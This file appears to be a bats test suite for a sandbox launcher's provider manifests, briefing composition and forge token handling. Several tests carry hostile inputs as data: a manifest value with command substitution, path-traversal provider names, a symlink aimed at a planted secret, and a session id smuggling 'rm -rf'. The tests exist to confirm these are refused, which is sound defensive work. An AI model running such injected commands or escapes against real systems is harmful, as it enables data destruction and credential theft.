#!/usr/bin/env bats
# Providers are data, not code. These tests are mostly about what a malformed
# or over-reaching manifest is NOT allowed to do.

setup() {
    REPO_ROOT="$BATS_TEST_DIRNAME/.."
    LIB="$REPO_ROOT/bin/dejima-provider-lib.sh"
    LIB_PROJECT="$REPO_ROOT/bin/dejima-project-lib.sh"
    CONFIG_DIR="$(mktemp -d)"
    export DEJIMA_CONFIG_DIR="$CONFIG_DIR"
}
teardown() { rm -rf "$CONFIG_DIR" ${FAKE_ROOT:+"$FAKE_ROOT"}; }

lib() { bash -c 'source "$1"; shift; "$@"' _ "$LIB" "$@"; }

# Checks the CLAIM a remedy message makes rather than pinning its wording:
# every "forge = <name>" it names must be a forge that actually exists. A
# literal like "forge = github" would still pass this after github was
# renamed or removed, silently advising a value that no longer works.
assert_remedy_forges_exist() {
    local text="$1" real name found=0
    real="$(lib provider_list forge)"
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        found=1
        grep -qxF "$name" <<< "$real" || { echo "remedy names nonexistent forge: $name"; return 1; }
    done < <(grep -oE 'forge = [a-z0-9-]+' <<< "$text" | awk '{print $3}')
    [ "$found" -eq 1 ] || { echo "remedy names no forge at all"; return 1; }
}

@test "every shipped manifest validates" {
    for axis in forge workflow harness; do
        while IFS= read -r name; do
            [ -n "$name" ] || continue
            run lib manifest_validate "$axis" "$name"
            [ "$status" -eq 0 ] || { echo "$axis/$name: $output"; return 1; }
        done < <(lib provider_list "$axis")
    done
}

@test "each axis ships at least one provider" {
    for axis in forge workflow harness; do
        [ -n "$(lib provider_list "$axis")" ] || { echo "no $axis providers"; return 1; }
    done
}

@test "an unknown manifest key is fatal" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/bogus"
    printf 'capabilities = pr\nnonesuch = 1\n' > "$FAKE_ROOT/forges/bogus/forge.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; manifest_validate forge bogus' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"unknown key"* ]]
}

@test "a manifest is parsed, never sourced" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/evil"
    printf 'capabilities = pr\npr_command = $(touch %s/PWNED)\n' "$FAKE_ROOT" \
        > "$FAKE_ROOT/forges/evil/forge.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; manifest_validate forge evil' _ "$LIB"
    [ ! -e "$FAKE_ROOT/PWNED" ]
    # And the value is refused outright rather than merely not executed.
    [ "$status" -ne 0 ]
}

# A manifest is parsed once per process and every later read is answered from
# that parse, so these three pin the refusals to the cache rather than to the
# first call: a check that only ran on the way in would leave every read after
# it unguarded, which is the whole risk of caching a trust boundary.

@test "a refused manifest is refused again, not just the first time" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/harnesses/halfbad"
    printf 'command = claude\nguards = bad!!name\n' \
        > "$FAKE_ROOT/harnesses/halfbad/harness.conf"
    # Only the verdicts are asserted on: the first call legitimately explains
    # the refusal on stderr, and the second is entitled to stay quiet.
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" bash -c '
        source "$1" 2>/dev/null
        manifest_validate harness halfbad 2>/dev/null && echo "first accepted"
        manifest_validate harness halfbad 2>/dev/null && echo "second accepted"
        exit 0' _ "$LIB"
    [[ "$output" != *accepted* ]] || { echo "$output"; return 1; }
}

@test "no value of a manifest that fails validation is readable" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/harnesses/halfbad"
    # `command` is valid and comes first, so a parser that published values as
    # it went would hand this one out before reaching the line that refuses.
    printf 'command = claude\nguards = bad!!name\n' \
        > "$FAKE_ROOT/harnesses/halfbad/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; manifest_get harness halfbad command' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" != *claude* ]] || { echo "leaked a value: $output"; return 1; }
}

@test "a read is not answered from a manifest under a different provider root" {
    FAKE_ROOT="$(mktemp -d)"
    for root in one two; do
        mkdir -p "$FAKE_ROOT/$root/harnesses/h"
        printf 'command = %s\n' "$root" > "$FAKE_ROOT/$root/harnesses/h/harness.conf"
    done
    run bash -c '
        source "$1"
        DEJIMA_PROVIDER_ROOT="$2/one" manifest_get harness h command
        printf " "
        DEJIMA_PROVIDER_ROOT="$2/two" manifest_get harness h command' _ "$LIB" "$FAKE_ROOT"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$output" = "one two" ] || { echo "got '$output', wanted 'one two'"; return 1; }
}

@test "provider_dir refuses a name that escapes the axis directory" {
    for bad in ".." "../../etc" "a/b" "" "."; do
        run lib provider_dir forge "$bad"
        [ "$status" -ne 0 ] || { echo "accepted provider name '$bad'"; return 1; }
    done
}

@test "manifest_get returns a value and refuses an unknown key" {
    run lib manifest_get forge gitea pr_command
    [ "$status" -eq 0 ]
    [ -n "$output" ]
    run lib manifest_get forge gitea nonesuch
    [ "$status" -ne 0 ]
}

@test "provider_dir refuses a symlink pointing outside the axis directory" {
    FAKE_ROOT="$(mktemp -d)"
    TARGET="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges" "$TARGET/planted"
    printf 'capabilities = pr\n' > "$TARGET/planted/forge.conf"
    ln -s "$TARGET/planted" "$FAKE_ROOT/forges/evil-link"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_dir forge evil-link' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"forges"* ]]
    rm -rf "$TARGET"
}

@test "provider_dir refuses a dangling symlink" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges"
    ln -s /nonexistent/target "$FAKE_ROOT/forges/dangling-link"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_dir forge dangling-link' _ "$LIB"
    [ "$status" -ne 0 ]
}

@test "a briefing fragment that is a symlink escaping its provider directory is refused" {
    # File-level counterpart to the directory-level checks above:
    # provider_dir contains the *directory*, but the manifest's `briefing`
    # relpath still names a filesystem entry that can itself be a symlink -
    # e.g. a compromised session on the read-write project mount replacing a
    # provider's briefing.md with a symlink to an arbitrary host file (an SSH
    # key, say). Confirmed this leaks without the fix: composing against the
    # unpatched _briefing_provider_fragment printed the planted secret text
    # verbatim, with exit 0.
    FAKE_ROOT="$(mktemp -d)"
    TARGET="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/w" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities = pr\npr_command = x\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires = pr\npush = off\nbriefing = briefing.md\n' > "$FAKE_ROOT/workflows/w/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    printf 'FAKE-HOST-SECRET-abc123\n' > "$TARGET/secret"
    ln -s "$TARGET/secret" "$FAKE_ROOT/workflows/w/briefing.md"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; briefing_compose f w h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" != *"FAKE-HOST-SECRET"* ]]
    rm -rf "$TARGET"
}

@test "a briefing fragment that is a dangling symlink is refused" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/w" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities = pr\npr_command = x\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires = pr\npush = off\nbriefing = briefing.md\n' > "$FAKE_ROOT/workflows/w/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    ln -s /nonexistent/target "$FAKE_ROOT/workflows/w/briefing.md"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; briefing_compose f w h' _ "$LIB"
    [ "$status" -ne 0 ]
}

@test "gitea's manifest names the CLIs it actually ships" {
    while IFS= read -r rel; do
        [ -n "$rel" ] || continue
        [ -f "$REPO_ROOT/forges/gitea/$rel" ] \
            || { echo "install names a missing file: $rel"; return 1; }
        [ -x "$REPO_ROOT/forges/gitea/$rel" ] \
            || { echo "install names a non-executable file: $rel"; return 1; }
    done < <(lib manifest_get forge gitea install | tr ' ' '\n')
}

@test "a forge's pr_command resolves to something the image will have" {
    # Either a file the forge ships, or a binary the Dockerfile installs.
    for f in $(lib provider_list forge); do
        cmd="$(lib manifest_get forge "$f" pr_command)"
        [ -n "$cmd" ] || continue
        word0="${cmd%% *}"
        if [ -f "$REPO_ROOT/forges/$f/bin/$word0" ]; then continue; fi
        grep -q "$word0" "$REPO_ROOT/docker/Dockerfile" \
            || { echo "$f: pr_command '$cmd' is neither shipped nor installed"; return 1; }
    done
}

@test "the Dockerfile copies every forge's bin, not one forge by name" {
    grep -q 'COPY forges/' "$REPO_ROOT/docker/Dockerfile"
    run grep -n 'COPY bin/gitea' "$REPO_ROOT/docker/Dockerfile"
    [ "$status" -ne 0 ]
}

@test "the briefing tells an agent how a refusal differs from a hang" {
    # The policy rejects rather than drops, for the reason its own chain
    # comment gives: silently dropping makes every blocked destination look
    # like a hang. The briefing described both as failing to connect, which
    # throws that signal away - and two agents in one day reported a host
    # firewall on the far side as dejima blocking a domain, because from
    # inside a sandbox the two are indistinguishable except by timing.
    local lib="$REPO_ROOT/bin/dejima-provider-lib.sh"
    grep -q 'refused at once rather than' "$lib" \
        || { echo "the briefing no longer says a refusal is immediate"; return 1; }
    grep -q 'HANGS is not this allowlist' "$lib" \
        || { echo "the briefing no longer tells an agent what a hang means"; return 1; }

    # And the property it describes is still true of the policy, so the advice
    # cannot outlive the behaviour it rests on.
    local chain
    chain=$(sed -n '/^  chain refuse {/,/^  }/p' "$REPO_ROOT/docker/egress-policy")
    [ -n "$chain" ] || { echo "no refuse chain in the policy"; return 1; }
    grep -q 'reject with tcp reset' <<< "$chain" \
        || { echo "the policy no longer rejects TCP, so a block would hang"; return 1; }
    grep -q 'reject with icmpx' <<< "$chain" \
        || { echo "the policy no longer rejects non-TCP"; return 1; }
    grep -qE '(^|[^a-z])drop([^a-z]|$)' <<< "$chain" \
        && { echo "the refuse chain drops as well as rejects: $chain"; return 1; }
    true
}

@test "gitea's CLIs moved out of bin/ and into its forge" {
    [ ! -e "$REPO_ROOT/bin/gitea-pr" ]
    [ ! -e "$REPO_ROOT/bin/gitea-issue" ]
    [ -x "$REPO_ROOT/forges/gitea/bin/gitea-pr" ]
    [ -x "$REPO_ROOT/forges/gitea/bin/gitea-issue" ]
}

@test "a sandbox missing its forge token is not told to create one in the container" {
    # The token reaches a sandbox as GITEA_TOKEN, read host-side from whatever
    # the forge's token_file names. The file these tools fall back to is
    # deliberately absent in the container, so a message naming it as the remedy
    # sends an agent to write a credential into a disposable filesystem - or, if
    # it cannot, to report that it is unable to work when nothing is wrong with
    # the arrangement. That happened.
    # One subcommand per tool that actually reaches the token check.
    local spec t sub
    for spec in gitea-pr:create gitea-issue:create gitea-actions:runs; do
        t=${spec%%:*}; sub=${spec#*:}
        run env -u GITEA_TOKEN DEJIMA=1 GITEA_SSH_HOST=x GITEA_API=http://x/api/v1 \
            HOME="$BATS_TEST_TMPDIR/nohome" bash "$REPO_ROOT/forges/gitea/bin/$t" "$sub"
        [ "$status" -ne 0 ] || { echo "$t proceeded with no token"; return 1; }
        [[ "$output" == *"arrives as GITEA_TOKEN"* ]] \
            || { echo "$t does not say where the token comes from: $output"; return 1; }
        [[ "$output" != *"save it to"* ]] \
            || { echo "$t still tells a sandbox to save a token file: $output"; return 1; }
    done

    # And the host-side message is unchanged, where writing the file IS the
    # remedy and nothing exports the variable.
    run env -u GITEA_TOKEN -u DEJIMA GITEA_SSH_HOST=x GITEA_API=http://x/api/v1 \
        HOME="$BATS_TEST_TMPDIR/nohome" bash "$REPO_ROOT/forges/gitea/bin/gitea-pr" create
    [[ "$output" == *"save it to"* ]] \
        || { echo "the host-side remedy is gone: $output"; return 1; }
}

@test "a workflow requiring a capability its forge lacks is refused" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/bare" "$FAKE_ROOT/workflows/needy" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities =\n' > "$FAKE_ROOT/forges/bare/forge.conf"
    printf 'requires = pr\npush = off\n' > "$FAKE_ROOT/workflows/needy/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_validate_selection bare needy h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"pr"* ]]
    [[ "$output" == *"bare"* ]]
    [[ "$output" == *"needy"* ]]
}

@test "a pushing workflow on a forge with no hosts is refused" {
    # gitea's ssh_host/api have no schema default and install.sh writes them
    # commented out, so this is what an operator who selects a pushing
    # workflow without configuring the forge hits - `forge = none` (the
    # shipped default) is the honest way to say "no forge" instead.
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/hostless" "$FAKE_ROOT/workflows/pusher" "$FAKE_ROOT/harnesses/h"
    # keys is non-empty - this forge IS configurable, just not configured -
    # unlike `none`, which has no keys at all and gets its own message below.
    printf 'capabilities =\nkeys = ssh_host:?hostname\n' > "$FAKE_ROOT/forges/hostless/forge.conf"
    printf 'requires =\npush = on\n' > "$FAKE_ROOT/workflows/pusher/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_validate_selection hostless pusher h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"forge = none"* ]]
}

@test "a pushing workflow against a forge with no host is refused, and names none" {
    # gitea with nothing configured resolves to no host at all.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"forge = none"* ]]
}

@test "a partly configured forge is refused, not merely warned about" {
    # token_file is not named here (and would not need to be, to make this
    # partial): its schema default (~/.config/gitea/token) means it can
    # never be genuinely missing, so it never enters set_n/unset_n at all -
    # see "the shipped selection validates with the documented setup" below.
    printf '[forge.gitea]\nssh_host = git.example\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"api"* ]]
}

@test "the shipped defaults are a non-pushing pair that validates with no forge configured" {
    # A fresh install must launch. The defaults were gitea + worktree-pr,
    # which is a PUSHING pair, and rule 3 refuses a pushing workflow whose
    # forge resolves to no host - so an unedited config was refused at every
    # launch until a forge was configured. Driven off the schema rather than
    # the literal names, so a future default that reintroduces the
    # contradiction fails here, next to the rule it contradicts, instead of
    # in twenty-odd launcher tests that never mention forges.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    local forge workflow harness
    forge="$(lib config_default core.forge)"
    workflow="$(lib config_default core.workflow)"
    # No default to read: the shipped pair under test is forge/workflow.
    harness=claude-code
    [ "$(lib manifest_get workflow "$workflow" push)" = "off" ] \
        || { echo "default workflow '$workflow' pushes - a fresh install has no forge to push to"; return 1; }
    run lib provider_validate_selection "$forge" "$workflow" "$harness"
    [ "$status" -eq 0 ] || { echo "the shipped defaults do not validate unconfigured: $output"; return 1; }
}

@test "a non-pushing workflow against an unconfigured forge is still fine" {
    # local-only pushes nothing, so having no host is not a contradiction.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection none local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "the shipped selection validates with the documented setup" {
    # This is the regression guard for the README/install.sh setup: an
    # operator is told to set only ssh_host and api and save the token at
    # token_file's schema default path (~/.config/gitea/token), leaving
    # token_file itself unset in the config. A key with a non-empty schema
    # default can never be genuinely missing - its resolved value is already
    # correct - so it must not make this look partly configured and refused.
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\n' \
        > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "a wholly unconfigured forge still validates against a non-pushing workflow" {
    # The supported "I don't use a forge" case is now scoped to a workflow
    # that doesn't push (local-only) - a pushing one is rule 3's refusal
    # above. Rules 3 and 5 (and the single-required-key check) are all
    # gated on push = on, so local-only never reaches any of them regardless
    # of what is or isn't configured.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "a partially configured forge still validates against a non-pushing workflow" {
    # Rule 5 is gated on push = on: local-only never invokes the forge, so
    # setting only ssh_host (e.g. so the firewall allows fetches) is a
    # legitimate configuration, not a typo to refuse.
    printf '[forge.gitea]\nssh_host = git.example\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "a pushing workflow against forge = none names the workflow, not [forge.none]" {
    # none has no keys at all, so "Configure [forge.none]" would be a fix
    # that does not exist - the only honest remedy is the workflow.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection none branch-push claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"nothing to configure"* ]]
    [[ "$output" == *"workflow = local-only"* ]]
    [[ "$output" != *"[forge.none]"* ]]
}

@test "a pushing workflow against a single-required-key forge with nothing set is refused" {
    # github's fixed_hosts (github.com et al) are pinned independent of
    # config, so forge_hosts is never empty and rule 3 alone would let a
    # wholly unconfigured github sail through. github's `requires` is also
    # exactly one key, so it can never be "partly" configured (rule 5's own
    # condition) - it is either wholly set or wholly unset. This is the gap
    # between the two rules that only a dedicated check closes.
    printf '[core]\nfirewall = on\nforge = github\nworkflow = branch-push\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection github branch-push claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"push_token_file"* ]]
}

@test "forge_hosts unions literal host keys, URL-derived hosts and fixed hosts" {
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\n' \
        > "$CONFIG_DIR/config"
    run lib forge_hosts gitea
    [ "$status" -eq 0 ]
    [[ "$output" == *"git.example"* ]]
    [[ "$output" == *"api.example"* ]]
    # The scheme and path never survive into a firewall entry.
    [[ "$output" != *"https"* ]]
    [[ "$output" != *"/v1"* ]]
}

@test "a token file containing an embedded newline makes forge_env_exports fail" {
    printf '[forge.gitea]\ntoken_file = %s/token\n' "$CONFIG_DIR" > "$CONFIG_DIR/config"
    printf 'line1\nline2\n' > "$CONFIG_DIR/token"
    run lib forge_env_exports gitea
    [ "$status" -ne 0 ]
    [[ "$output" == *"newline"* ]]
    # The secret must never appear in the error message.
    [[ "$output" != *"line1"* ]]
    [[ "$output" != *"line2"* ]]
}

@test "a single-line token file with trailing newline works and yields one record" {
    printf '[forge.gitea]\ntoken_file = %s/token\n' "$CONFIG_DIR" > "$CONFIG_DIR/config"
    printf 'my-secret-token\n' > "$CONFIG_DIR/token"
    run lib forge_env_exports gitea
    [ "$status" -eq 0 ]
    # $(<file) strips trailing newlines, so the GITEA_TOKEN line should have no
    # embedded newline - the output includes the api and ssh_host lines too, and
    # the test is specifically about the token line surviving a trailing newline.
    # grep for just the line with content and verify it has no embedded newlines.
    token_line="$(printf '%s\n' "$output" | grep '^GITEA_TOKEN=')"
    [ "$token_line" = "GITEA_TOKEN=my-secret-token" ]
}

@test "an '&' in a substituted value survives composition literally" {
    # Regression check: bash 5.2's patsub_replacement (on by default) makes a
    # literal "&" in a ${var//pat/rep} replacement expand to the matched
    # text - here the {{writable_mounts}} token itself - which leaves the
    # marker in place instead of substituting it. [mounts] read_write's own
    # `path` type explicitly permits "&", so a value like /tmp/x/R&D made
    # bin/dejima refuse to launch with "an unresolved placeholder remains
    # after briefing composition" - confirmed directly against the unpatched
    # _briefing_substitute before this fix, which fails closed only by luck
    # of the marker containing braces.
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\ntoken_file = /dev/null\n' \
        > "$CONFIG_DIR/config"
    run env DEJIMA_RW_MOUNTS='/tmp/x/R&D' bash -c \
        'source "$1"; briefing_compose gitea worktree-pr claude-code' _ "$LIB"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *'/tmp/x/R&D'* ]]
    [[ "$output" != *"{{"* ]]
    [[ "$output" != *"}}"* ]]
}

@test "composition substitutes the whitelist and defers the two runtime keys" {
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\ntoken_file = /dev/null\n' \
        > "$CONFIG_DIR/config"
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"gitea-pr create"* ]]
    [[ "$output" == *"git.example"* ]]
    [[ "$output" == *"@@SESSION_ID@@"* ]]
    [[ "$output" == *"@@CONTAINER_ID@@"* ]]
    # No placeholder survives composition in either spelling.
    [[ "$output" != *"{{"* ]]
    [[ "$output" != *"}}"* ]]
}

@test "an unknown placeholder is refused rather than emitted literally" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/w" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities = pr\npr_command = x\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires = pr\npush = off\nbriefing = briefing.md\n' > "$FAKE_ROOT/workflows/w/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    printf 'Run {{nonesuch}} to proceed.\n' > "$FAKE_ROOT/workflows/w/briefing.md"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; briefing_compose f w h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"nonesuch"* ]]
}

@test "the core fragment is present and is not provider-supplied" {
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ]
    # The containment reasoning a provider must not be able to remove.
    [[ "$output" == *"allowlist"* ]]
    [[ "$output" == *"Stay within the task"* ]]
    # And it is not reachable as a file any provider ships.
    run bash -c 'ls "$1"/workflows/*/core* "$1"/forges/*/core* 2>/dev/null' _ "$REPO_ROOT"
    [ -z "$output" ]
}

@test "a provider briefing fragment is capped" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/w" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities = pr\npr_command = x\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires = pr\npush = off\nbriefing = briefing.md\n' > "$FAKE_ROOT/workflows/w/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    head -c 40000 /dev/zero | tr '\0' 'x' > "$FAKE_ROOT/workflows/w/briefing.md"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; briefing_compose f w h' _ "$LIB"
    [ "${#output}" -lt 40000 ]
}

@test "every placeholder in every shipped fragment is in the whitelist" {
    found=0
    while IFS= read -r f; do
        [ -n "$f" ] || continue
        while IFS= read -r ph; do
            [ -n "$ph" ] || continue
            found=1
            # Against the real whitelist, not a copy of it. A second list here
            # would have to be edited in step with the first, and the failure
            # mode of forgetting is this test passing on a placeholder
            # composition then refuses - which is the launch, not the suite.
            lib _briefing_whitelisted "$ph" \
                || { echo "$f uses unknown placeholder: $ph"; return 1; }
        done < <(grep -oE '\{\{[a-z_]+\}\}' "$f" | tr -d '{}')
    done < <(find "$REPO_ROOT/workflows" "$REPO_ROOT/harnesses" "$REPO_ROOT/forges" -name '*.md' -o -name '*.conf')
    # Guards against a grep that silently matches nothing.
    [ "$found" = 1 ]
}

@test "the hook substitutes only the two runtime placeholders" {
    # env -u, because these run inside a dejima sandbox as often as not, and
    # there the briefing-delivery variables are set - the hook then emits only
    # the session id and never reads the file under test. That made this one
    # fail and the next one pass for the wrong reason, its assertion being
    # satisfied by the session id the stub carries anyway. See .dejima.md.
    b="$(mktemp)"
    printf 'session=@@SESSION_ID@@ container=@@CONTAINER_ID@@\n' > "$b"
    run env -u DEJIMA_BRIEFING_VIA_ARGS -u DEJIMA_BRIEFING_RENDERED DEJIMA=1 DEJIMA_BRIEFING_FILE="$b" bash -c \
        'printf "{\"session_id\":\"abc123\",\"cwd\":\"$PWD\"}" | bash "$1"' _ \
        "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -eq 0 ]
    ctx="$(printf '%s' "$output" | jq -r '.hookSpecificOutput.additionalContext')"
    [[ "$ctx" == *"session=abc123"* ]]
    [[ "$ctx" != *"@@SESSION_ID@@"* ]]
    [[ "$ctx" != *"@@CONTAINER_ID@@"* ]]
    rm -f "$b"
}

@test "the hook handles session ids with & / and \\ without mangling them" {
    # Regression check: bash 5.2's patsub_replacement (on by default) makes "&"
    # in parameter expansion replacements expand to the matched text. A session
    # id from the harness payload (untrusted) containing "&" would defeat the
    # substitution, leaving the marker and corrupting the --resume line. The fix
    # uses prefix/suffix removal instead, which never interprets the value.
    # Covering all three special cases (& / \) ensures a future rewrite that
    # switches to sed or another mechanism doesn't regress on any of them.
    b="$(mktemp)"
    printf 'resume-cmd: dejima --resume @@SESSION_ID@@\ncontainer=@@CONTAINER_ID@@\n' > "$b"
    # Session id crafted to test each special case in the replacement context.
    # Use printf %s so the value is never interpreted by the shell.
    run env -u DEJIMA_BRIEFING_VIA_ARGS -u DEJIMA_BRIEFING_RENDERED DEJIMA=1 DEJIMA_BRIEFING_FILE="$b" bash -c \
        'printf "{\"session_id\":%s,\"cwd\":\"%s\"}" "$(printf "%s" "$1" | jq -Rs .)" "$PWD" | bash "$2"' _ \
        'pr-42&rm -rf /tmp\test/path' "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -eq 0 ]
    ctx="$(printf '%s' "$output" | jq -r '.hookSpecificOutput.additionalContext')"
    # The session id must appear verbatim
    [[ "$ctx" == *"pr-42&rm -rf /tmp"* ]] || { echo "session id & not found"; return 1; }
    [[ "$ctx" == *"test/path"* ]] || { echo "session id path not found"; return 1; }
    # No marker may remain
    [[ "$ctx" != *"@@SESSION_ID@@"* ]] || { echo "@@SESSION_ID@@ marker remained"; return 1; }
    [[ "$ctx" != *"@@CONTAINER_ID@@"* ]] || { echo "@@CONTAINER_ID@@ marker remained"; return 1; }
    rm -f "$b"
}

@test "a missing briefing file degrades rather than failing the session" {
    run env -u DEJIMA_BRIEFING_VIA_ARGS -u DEJIMA_BRIEFING_RENDERED DEJIMA=1 DEJIMA_BRIEFING_FILE=/nonexistent/briefing bash -c \
        'printf "{\"session_id\":\"x\",\"cwd\":\"$PWD\"}" | bash "$1"' _ \
        "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -eq 0 ]
    printf '%s' "$output" | jq -e '.hookSpecificOutput.additionalContext' >/dev/null
}

@test "the hook no longer carries the briefing text itself" {
    # The prose lives in the core fragment and the provider fragments now; a
    # copy left behind here would drift silently.
    run grep -c 'gitea-pr create' "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$output" = "0" ]
    run grep -ci 'gitea' "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$output" = "0" ]
}

@test "the none forge declares no capabilities, keys or hosts" {
    run lib manifest_validate forge none
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ -z "$(lib manifest_get forge none capabilities)" ]
    [ -z "$(lib manifest_get forge none keys)" ]
    [ -z "$(lib manifest_get forge none requires)" ]
    # No host sources at all - this is what makes it the honest "I have no
    # forge" answer rather than a forge that merely isn't configured yet.
    [ -z "$(lib forge_hosts none)" ]
    [ -z "$(lib forge_env_exports none)" ]
}

@test "the none forge ships no CLIs into the image" {
    [ -z "$(lib manifest_get forge none install)" ]
    [ ! -d "$REPO_ROOT/forges/none/bin" ]
}

@test "a workflow needing a capability is refused against the none forge" {
    run lib provider_validate_selection none worktree-pr claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"requires the 'pr' capability"* ]]
}

@test "docs/providers.md documents every manifest key" {
    for axis in forge workflow harness; do
        while IFS=$'\t' read -r key _rest; do
            [ -n "$key" ] || continue
            grep -q "\`$key\`" "$REPO_ROOT/docs/providers.md" \
                || { echo "$axis key '$key' is undocumented"; return 1; }
        done < <(bash -c 'source "$1"; _manifest_table "$2"' _ "$LIB" "$axis")
    done
}

@test "docs/providers.md documents every shipped provider" {
    local doc="$REPO_ROOT/docs/providers.md" axis name
    for axis in forge workflow harness; do
        while IFS= read -r name; do
            [ -n "$name" ] || continue
            grep -q "$name" "$doc" || { echo "docs/providers.md never mentions $axis '$name'"; return 1; }
        done < <(lib provider_list "$axis")
    done
}

@test "no doc still says the new providers are unbuilt" {
    ! grep -qi 'not yet built\|Phase 3 candidates\|deferred to Phase 3' "$REPO_ROOT/docs/providers.md"
}

@test "the github forge's firewall posture change is documented" {
    grep -q 'ssh.github.com' "$REPO_ROOT/docs/providers.md"
    grep -qi 'push' "$REPO_ROOT/docs/providers.md"
}

